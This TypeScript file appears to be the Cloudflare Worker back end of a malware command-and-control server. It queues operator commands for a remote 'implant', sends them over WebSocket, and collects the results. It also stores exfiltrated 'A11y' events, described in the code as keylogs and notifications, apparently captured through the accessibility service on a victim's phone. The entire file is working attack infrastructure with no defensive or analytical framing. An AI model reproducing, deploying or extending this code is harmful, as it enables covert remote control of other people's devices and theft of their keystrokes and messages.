import { DurableObject } from 'cloudflare:workers';

interface Env {
  STORAGE: R2Bucket;
  FLEET_CONFIG: KVNamespace;
  OPERATOR_PUBKEY: string;
}

interface CommandResult {
  id: string;
  cmd: string;
  data: string;
  ts: number;
}

export class ImplantDO extends DurableObject {
  private sessions: Map<string, { connectedAt: number; lastPing: number }>;
  private lastHeartbeat: number = 0;
  private implantInfo: any = null;

  constructor(state: DurableObjectState, env: Env) {
    super(state, env);
    this.sessions = new Map();
    this.ctx.storage.sql.exec(
      `CREATE TABLE IF NOT EXISTS command_queue (
        id TEXT PRIMARY KEY,
        command TEXT NOT NULL,
        payload TEXT,
        status TEXT DEFAULT 'pending',
        result TEXT,
        queued_at INTEGER,
        completed_at INTEGER
      )`
    );
    this.ctx.storage.sql.exec(
      `CREATE TABLE IF NOT EXISTS implant_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type TEXT,
        tag TEXT,
        data TEXT,
        ts INTEGER
      )`
    );
  }

  async fetch(request: Request): Promise<Response> {
    const url = new URL(request.url);

    // WebSocket upgrade from implant
    if (request.headers.get('Upgrade') === 'websocket') {
      return this.handleWebSocketUpgrade(request, url.pathname.split('/')[2] || 'wss');
    }

    // RPC from the Worker (operator commands, result polling)
    if (url.pathname === '/rpc' && request.method === 'POST') {
      const body = await request.json();
      return this.handleOperatorRPC(body);
    }

    return new Response('Not found', { status: 404 });
  }

  private handleWebSocketUpgrade(request: Request, _transportType: string): Response {
    const pair = new WebSocketPair();
    const [client, server] = Object.values(pair) as [WebSocket, WebSocket];

    this.ctx.acceptWebSocket(server, ['implant']);

    this.sessions.set('primary', {
      connectedAt: Date.now(),
      lastPing: Date.now(),
    });

    // Flush pending commands to the implant upon connection
    this.flushQueue(server);

    return new Response(null, {
      status: 101,
      webSocket: client,
    });
  }

  private handleOperatorRPC(body: any): Response {
    const { command, payload } = body;

    switch (command) {
      case 'send_command': {
        const cmdId = crypto.randomUUID();
        this.ctx.storage.sql.exec(
          `INSERT INTO command_queue (id, command, payload, status, queued_at) VALUES (?, ?, ?, 'pending', ?)`,
          cmdId, payload?.command || '', JSON.stringify(payload?.payload || {}), Date.now()
        );
        // Send to connected implant immediately
        let sent = false;
        for (const ws of this.ctx.getWebSockets()) {
          if (ws.readyState === WebSocket.OPEN) {
            const frame = JSON.stringify({
              id: cmdId,
              c: payload?.command,
              p: payload?.payload || {},
            });
            ws.send(frame);
            sent = true;
            this.ctx.storage.sql.exec(
              `UPDATE command_queue SET status = 'sent' WHERE id = ?`, cmdId
            );
            break;
          }
        }
        return new Response(JSON.stringify({ success: true, cmdId, sent }), {
          headers: { 'Content-Type': 'application/json' },
        });
      }

      case 'get_result': {
        const { cmdId } = payload || {};
        if (cmdId) {
          const rows = this.ctx.storage.sql.exec(
            `SELECT id, command, status, result, completed_at FROM command_queue WHERE id = ?`,
            cmdId
          ).toArray();
          if (rows.length > 0) {
            return new Response(JSON.stringify({
              success: true,
              result: {
                id: rows[0].id,
                status: rows[0].status,
                data: rows[0].result,
                completedAt: rows[0].completed_at,
              }
            }), {
              headers: { 'Content-Type': 'application/json' },
            });
          }
          return new Response(JSON.stringify({ success: true, result: null }), {
            headers: { 'Content-Type': 'application/json' },
          });
        }
        // Return all recent results
        const results = this.ctx.storage.sql.exec(
          `SELECT id, command, status, result, completed_at FROM command_queue
           WHERE status = 'completed' ORDER BY completed_at DESC LIMIT 50`
        ).toArray();
        return new Response(JSON.stringify({ success: true, results }), {
          headers: { 'Content-Type': 'application/json' },
        });
      }

      case 'get_status': {
        const connected = this.ctx.getWebSockets().length > 0;
        return new Response(JSON.stringify({
          success: true,
          status: {
            connected,
            sessions: this.ctx.getWebSockets().length,
            lastHeartbeat: this.lastHeartbeat,
            implantInfo: this.implantInfo,
            pendingCommands: this.ctx.storage.sql.exec(
              `SELECT COUNT(*) as count FROM command_queue WHERE status IN ('pending','sent')`
            ).toArray()[0]?.count || 0,
          }
        }), {
          headers: { 'Content-Type': 'application/json' },
        });
      }

      case 'get_events': {
        const events = this.ctx.storage.sql.exec(
          `SELECT * FROM implant_events ORDER BY ts DESC LIMIT 100`
        ).toArray();
        return new Response(JSON.stringify({ success: true, events }), {
          headers: { 'Content-Type': 'application/json' },
        });
      }

      default:
        return new Response(JSON.stringify({ error: `Unknown command: ${command}` }), {
          status: 400,
          headers: { 'Content-Type': 'application/json' },
        });
    }
  }

  private flushQueue(ws: WebSocket) {
    const pending = this.ctx.storage.sql.exec(
      `SELECT id, command, payload FROM command_queue WHERE status = 'pending'`
    ).toArray();
    for (const row of pending) {
      const frame = JSON.stringify({
        id: row.id,
        c: row.command,
        p: JSON.parse(row.payload || '{}'),
      });
      ws.send(frame);
      this.ctx.storage.sql.exec(
        `UPDATE command_queue SET status = 'sent' WHERE id = ?`, row.id
      );
    }
  }

  // --- WebSocket Hibernation Handlers ---

  async webSocketMessage(ws: WebSocket, message: string | ArrayBuffer) {
    try {
      const raw = typeof message === 'string' ? message : new TextDecoder().decode(message);
      const parsed = JSON.parse(raw);

      if (parsed.type === 'heartbeat') {
        this.lastHeartbeat = parsed.ts || Date.now();
        if (parsed.info) this.implantInfo = parsed.info;
        this.sessions.set('primary', {
          connectedAt: this.sessions.get('primary')?.connectedAt || Date.now(),
          lastPing: Date.now(),
        });
        return;
      }

      if (parsed.type === 'result' && parsed.id) {
        // Implant executed a command — store the result
        this.ctx.storage.sql.exec(
          `UPDATE command_queue SET status = 'completed', result = ?, completed_at = ? WHERE id = ?`,
          parsed.data || '', parsed.ts || Date.now(), parsed.id
        );
        return;
      }

      if (parsed.type === 'event') {
        // A11y exfil event (keylog, notification, etc.)
        this.ctx.storage.sql.exec(
          `INSERT INTO implant_events (type, tag, data, ts) VALUES (?, ?, ?, ?)`,
          parsed.type, parsed.tag || 'unknown', parsed.data || '', Date.now()
        );
        return;
      }

      if (parsed.type === 'handshake_response') {
        this.implantInfo = { ...this.implantInfo, pub: parsed.pub };
        return;
      }
    } catch (e) {
      console.error('Invalid frame from implant:', e);
    }
  }

  async webSocketClose(_ws: WebSocket, _code: number, _reason: string, _wasClean: boolean) {
    this.sessions.clear();
  }
}
